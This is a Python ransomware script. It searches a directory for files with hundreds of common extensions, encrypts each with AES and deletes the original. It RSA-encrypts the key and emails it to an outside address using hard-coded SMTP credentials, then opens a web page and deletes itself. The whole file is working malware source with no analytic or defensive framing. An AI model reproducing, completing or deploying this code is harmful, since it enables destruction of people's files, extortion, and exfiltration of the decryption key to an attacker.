#!/usr/bin/python3

from sys import argv
from os import walk, lstat
from os.path import getsize, splitext, join
from os import remove as rm
from struct import pack, unpack, calcsize
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
import Crypto.Random as rand
import webbrowser
import smtplib

def enc_key(key):
        k = rand.new().read(1)
        f = open("pubkey", "r");
        pub = RSA.importKey(f.read())
        f.close()
        return (pub.encrypt(key, k))

def sendMail(FROM, PASSWD, TO, TEXT, SERVER):
    message = """\
    From: %s
    To: %s
    %s
    """ % (FROM, TO, TEXT)
    server = smtplib.SMTP(SERVER)
    server.starttls()
    server.login(FROM, PASSWD)
    server.sendmail(FROM, TO, message)
    server.quit()

def mail(s):
    sender='youhavebeenhacked@pata.ovh'
    mdp='bunny12pixel'
    server='mail.pata.ovh:587'
    sendMail(sender,mdp,sender,s,server)

AUTORM=not "-keep" in argv
LEN_READ=1024
FILE_EXT='.enc'

TARGETS=(".jpg", ".jpeg", ".raw", ".tif", ".gif", ".png", ".bmp ", ".3dm", ".max", ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", ".dwg", ".dxf", ".c", ".cpp", ".cs", ".h", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".py", ".js", ".aaf", ".aep", ".aepx", ".plb", ".prel", ".prproj", ".aet", ".ppj", ".psd", ".indd", ".indl", ".indt", ".indb", ".inx", ".idml", ".pmd", ".xqx", ".xqx", ".ai", ".eps", ".ps", ".svg", ".swf", ".fla", ".as3", ".as", ".txt", ".doc", ".dot", ".docx", ".docm", ".dotx", ".dotm", ".docb", ".rtf", ".wpd", ".wps", ".msg", ".pdf", ".xls", ".xlt", ".xlm", ".xlsx", ".xlsm", ".xltx", ".xltm", ".xlsb", ".xla", ".xlam", ".xll", ".xlw", ".ppt", ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm", ".wav", ".mp3", ".aif", ".iff", ".m3u", ".m4u", ".mid", ".mpa", ".wma", ".ra", ".avi", ".mov", ".mp4", ".3gp", ".mpeg", ".3g2", ".asf", ".asx", ".flv", ".mpg", ".wmv", ".vob", ".m3u8", ".dat", ".csv", ".efx", ".sdf", ".vcf", ".xml", ".ses", ".Qbw", ".QBB", ".QBM", ".QBI", ".QBR ", ".Cnt", ".Des", ".v30", ".Qbo", ".Ini", ".Lgb", ".Qwc", ".Qbp", ".Aif", ".Qba", ".Tlg", ".Qbx", ".Qby ", ".1pa", ".Qpd", ".Txt", ".Set", ".Iif ", ".Nd", ".Rtp", ".Tlg", ".Wav", ".Qsm", ".Qss", ".Qst", ".Fx0", ".Fx1", ".Mx0", ".FPx", ".Fxr", ".Fim", ".ptb", ".Ai", ".Pfb", ".Cgn", ".Vsd", ".Cdr", ".Cmx", ".Cpt", ".Csl", ".Cur", ".Des", ".Dsf", ".Ds4", ".Drw", ".Dwg.Eps", ".Ps", ".Prn", ".Gif", ".Pcd", ".Pct", ".Pcx", ".Plt", ".Rif", ".Svg", ".Swf", ".Tga", ".Tiff", ".Psp", ".Ttf", ".Wpd", ".Wpg", ".Wi", ".Raw", ".Wmf", ".Txt", ".Cal", ".Cpx", ".Shw", ".Clk", ".Cdx", ".Cdt", ".Fpx", ".Fmv", ".Img", ".Gem", ".Xcf", ".Pic", ".Mac", ".Met", ".PP4", ".Pp5", ".Ppf", ".Xls", ".Xlsx", ".Xlsm", ".Ppt", ".Nap", ".Pat", ".Ps", ".Prn", ".Sct", ".Vsd", ".wk3", ".wk4", ".XPM", ".zip", ".rar", ".exe", ".dll", ".7z", ".tar", ".tar.gz", ".iso", ".mkv", ".m4a", ".ogg", ".wav", ".ini", ".msi")

if not len(argv) in [2, 3] or (len(argv)==2 and not AUTORM) or (len(argv)==3 and AUTORM):
        print("%s directory [-keep]"%(argv[0]))
        exit(0)

def recur_mtime(path):
        for dirpath, dirnames, filenames in walk(path):
                for fn in filenames:
                        filepath=join(dirpath, fn)
                        try:
                                mtime=lstat(filepath).st_mtime
                        except:
                                mtime=0.0
                        yield mtime, filepath

def walk_sorted(path):
        global TARGETS
        for mtime, filepath in sorted(recur_mtime(path),reverse=True):
                if filepath.endswith(TARGETS):
                        yield filepath

def crypt(key, filename):
    global LEN_READ, FILE_EXT
    newname=filename+FILE_EXT
    iv=rand.new().read(16)
    size=getsize(filename)
    cryptor = AES.new(key, AES.MODE_CBC, iv)
    with open(filename, "rb") as f_in:
        with open(newname, "wb") as f_out:
            f_out.write(pack('Q', size))
            f_out.write(iv)
            while True:
                txt=f_in.read(LEN_READ)
                l=len(txt)
                if l != LEN_READ:
                    if not l:
                        break
                    txt+=rand.new().read(LEN_READ - l)
                f_out.write(cryptor.encrypt(txt))
                del txt
                
def crypted_file(filename):
    global FILE_EXT
    return (True if filename.endswith(FILE_EXT) else False)

try:
        key=rand.new().read(16)
        sent_key=enc_key(key)
        if AUTORM:
                rm("pubkey")
        mail(sent_key[0])
        with open("key", "w") as k:
                k.write("%s"%sent_key)
except:
        print("Key failure")
        exit(0)
if len(key)!=16:
        print("Key failure")
        exit(0)

for name in walk_sorted(argv[1]):
        if not crypted_file(name):
                try:
                        crypt(key, name)
                        rm(name)
                except:
                        print("Encrypt failure : {}".format(name))

webbrowser.open_new('http://bunnypixelarray.github.io')
if AUTORM:                        
        try:
                rm(argv[0])
        except:
                print("auto-remove failure")
